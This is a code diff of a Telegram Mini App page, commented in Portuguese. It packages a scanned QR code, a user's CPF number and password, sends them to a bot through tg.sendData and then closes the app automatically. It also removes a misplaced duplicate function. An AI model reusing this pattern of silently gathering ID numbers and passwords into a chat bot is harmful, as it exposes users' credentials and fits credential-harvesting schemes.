@@ -52,21 +52,17 @@
                 return;
             }
 
-            // Cria um "pacote" com as informações
             let pacoteDados = {
                 qr_code: dadosQR,
                 cpf: cpf,
                 senha: senha
             };
 
-            // Envia o pacote de volta ao bot de forma invisível e fecha o Mini App
+            // Envia os dados de volta para o bot
             tg.sendData(JSON.stringify(pacoteDados));
-            // No seu arquivo index.html, dentro da função enviarDados()
-            function enviarDados() {
-                // ... seu código atual ...
-                tg.sendData(JSON.stringify(pacoteDados)); // Envia para o Python
-                tg.close(); // Força o Mini App a fechar na hora
-            }
+    
+            // Fecha o Mini App automaticamente
+            tg.close(); 
         }
     </script>
 </body>
